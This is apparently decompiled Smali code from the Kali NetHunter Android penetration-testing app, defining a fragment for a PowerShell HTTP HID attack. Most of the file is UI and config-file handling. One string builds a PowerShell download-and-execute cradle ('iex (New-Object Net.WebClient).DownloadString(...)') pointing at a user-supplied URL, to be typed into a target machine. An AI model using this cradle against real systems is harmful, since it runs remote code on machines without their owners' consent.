.class public Lcom/offsec/nethunter/HidFragment$PowershellHttpFragment;
.super Lcom/offsec/nethunter/HidFragment;
.source "HidFragment.java"

# interfaces
.implements Landroid/view/View$OnClickListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/offsec/nethunter/HidFragment;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x9
    name = "PowershellHttpFragment"
.end annotation


# instance fields
.field private configFilePath:Ljava/lang/String;

.field private configFileUrlPath:Ljava/lang/String;

.field private context:Landroid/content/Context;


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Lcom/offsec/nethunter/HidFragment;-><init>()V

    return-void
.end method

.method static synthetic lambda$loadOptions$0(Ljava/util/regex/Matcher;Landroid/widget/EditText;)V
    .locals 1

    invoke-virtual {p0}, Ljava/util/regex/Matcher;->find()Z

    move-result v0

    if-eqz v0, :cond_0

    const/4 v0, 0x1

    invoke-virtual {p0, v0}, Ljava/util/regex/Matcher;->group(I)Ljava/lang/String;

    move-result-object p0

    invoke-virtual {p1, p0}, Landroid/widget/EditText;->setText(Ljava/lang/CharSequence;)V

    :cond_0
    return-void
.end method

.method private loadOptions(Landroid/view/View;)V
    .locals 3

    const v0, 0x7f090372

    invoke-virtual {p1, v0}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/widget/EditText;

    new-instance v0, Lcom/offsec/nethunter/utils/ShellExecuter;

    invoke-direct {v0}, Lcom/offsec/nethunter/utils/ShellExecuter;-><init>()V

    new-instance v1, Ljava/lang/Thread;

    new-instance v2, Lcom/offsec/nethunter/HidFragment$PowershellHttpFragment$$ExternalSyntheticLambda0;

    invoke-direct {v2, p0, v0, p1}, Lcom/offsec/nethunter/HidFragment$PowershellHttpFragment$$ExternalSyntheticLambda0;-><init>(Lcom/offsec/nethunter/HidFragment$PowershellHttpFragment;Lcom/offsec/nethunter/utils/ShellExecuter;Landroid/widget/EditText;)V

    invoke-direct {v1, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v1}, Ljava/lang/Thread;->start()V

    return-void
.end method


# virtual methods
.method synthetic lambda$loadOptions$1$com-offsec-nethunter-HidFragment$PowershellHttpFragment(Lcom/offsec/nethunter/utils/ShellExecuter;Landroid/widget/EditText;)V
    .locals 3

    iget-object v0, p0, Lcom/offsec/nethunter/HidFragment$PowershellHttpFragment;->configFileUrlPath:Ljava/lang/String;

    invoke-virtual {p1, v0}, Lcom/offsec/nethunter/utils/ShellExecuter;->ReadFile_SYNC(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iget-object v1, p0, Lcom/offsec/nethunter/HidFragment$PowershellHttpFragment;->configFilePath:Ljava/lang/String;

    invoke-virtual {p1, v1}, Lcom/offsec/nethunter/utils/ShellExecuter;->ReadFile_SYNC(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    const-string v1, "DownloadString\\(\"(.*)\"\\)"

    const/16 v2, 0x8

    invoke-static {v1, v2}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;I)Ljava/util/regex/Pattern;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v0

    const-string v1, "\n"

    invoke-virtual {p1, v1}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object p1

    array-length v1, p1

    add-int/lit8 v1, v1, -0x1

    aget-object p1, p1, v1

    new-instance p1, Lcom/offsec/nethunter/HidFragment$PowershellHttpFragment$$ExternalSyntheticLambda1;

    invoke-direct {p1, v0, p2}, Lcom/offsec/nethunter/HidFragment$PowershellHttpFragment$$ExternalSyntheticLambda1;-><init>(Ljava/util/regex/Matcher;Landroid/widget/EditText;)V

    invoke-virtual {p2, p1}, Landroid/widget/EditText;->post(Ljava/lang/Runnable;)Z

    return-void
.end method

.method public onClick(Landroid/view/View;)V
    .locals 3

    invoke-virtual {p1}, Landroid/view/View;->getId()I

    move-result p1

    const v0, 0x7f090388

    if-ne p1, v0, :cond_1

    invoke-virtual {p0}, Lcom/offsec/nethunter/HidFragment$PowershellHttpFragment;->getView()Landroid/view/View;

    move-result-object p1

    if-nez p1, :cond_0

    return-void

    :cond_0
    new-instance p1, Lcom/offsec/nethunter/utils/ShellExecuter;

    invoke-direct {p1}, Lcom/offsec/nethunter/utils/ShellExecuter;-><init>()V

    invoke-virtual {p0}, Lcom/offsec/nethunter/HidFragment$PowershellHttpFragment;->getView()Landroid/view/View;

    move-result-object v0

    invoke-virtual {v0}, Landroid/view/View;->getRootView()Landroid/view/View;

    move-result-object v0

    const v1, 0x7f090372

    invoke-virtual {v0, v1}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/EditText;

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "iex (New-Object Net.WebClient).DownloadString(\""

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v0

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string v0, "\"); "

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    iget-object v1, p0, Lcom/offsec/nethunter/HidFragment$PowershellHttpFragment;->configFileUrlPath:Ljava/lang/String;

    invoke-virtual {p1, v0, v1}, Lcom/offsec/nethunter/utils/ShellExecuter;->SaveFileContents(Ljava/lang/String;Ljava/lang/String;)Z

    move-result p1

    if-nez p1, :cond_2

    iget-object p1, p0, Lcom/offsec/nethunter/HidFragment$PowershellHttpFragment;->context:Landroid/content/Context;

    const-string v0, "Source not updated (configFileUrlPath)"

    invoke-static {p1, v0}, Lcom/offsec/nethunter/utils/NhPaths;->showMessage(Landroid/content/Context;Ljava/lang/String;)V

    goto :goto_0

    :cond_1
    iget-object p1, p0, Lcom/offsec/nethunter/HidFragment$PowershellHttpFragment;->context:Landroid/content/Context;

    const-string v0, "Unknown click"

    invoke-static {p1, v0}, Lcom/offsec/nethunter/utils/NhPaths;->showMessage(Landroid/content/Context;Ljava/lang/String;)V

    :cond_2
    :goto_0
    return-void
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 1

    invoke-super {p0, p1}, Lcom/offsec/nethunter/HidFragment;->onCreate(Landroid/os/Bundle;)V

    invoke-virtual {p0}, Lcom/offsec/nethunter/HidFragment$PowershellHttpFragment;->getContext()Landroid/content/Context;

    move-result-object p1

    iput-object p1, p0, Lcom/offsec/nethunter/HidFragment$PowershellHttpFragment;->context:Landroid/content/Context;

    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {}, Lcom/offsec/nethunter/utils/NhPaths;->CHROOT_PATH()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, "/var/www/html/powershell-payload"

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    iput-object p1, p0, Lcom/offsec/nethunter/HidFragment$PowershellHttpFragment;->configFilePath:Ljava/lang/String;

    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {}, Lcom/offsec/nethunter/utils/NhPaths;->CHROOT_PATH()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, "/var/www/html/powershell-url"

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    iput-object p1, p0, Lcom/offsec/nethunter/HidFragment$PowershellHttpFragment;->configFileUrlPath:Ljava/lang/String;

    return-void
.end method

.method public onCreateView(Landroid/view/LayoutInflater;Landroid/view/ViewGroup;Landroid/os/Bundle;)Landroid/view/View;
    .locals 1

    const p3, 0x7f0c0053

    const/4 v0, 0x0

    invoke-virtual {p1, p3, p2, v0}, Landroid/view/LayoutInflater;->inflate(ILandroid/view/ViewGroup;Z)Landroid/view/View;

    move-result-object p1

    const p2, 0x7f090388

    invoke-virtual {p1, p2}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object p2

    check-cast p2, Landroid/widget/Button;

    invoke-virtual {p2, p0}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    invoke-direct {p0, p1}, Lcom/offsec/nethunter/HidFragment$PowershellHttpFragment;->loadOptions(Landroid/view/View;)V

    return-object p1
.end method
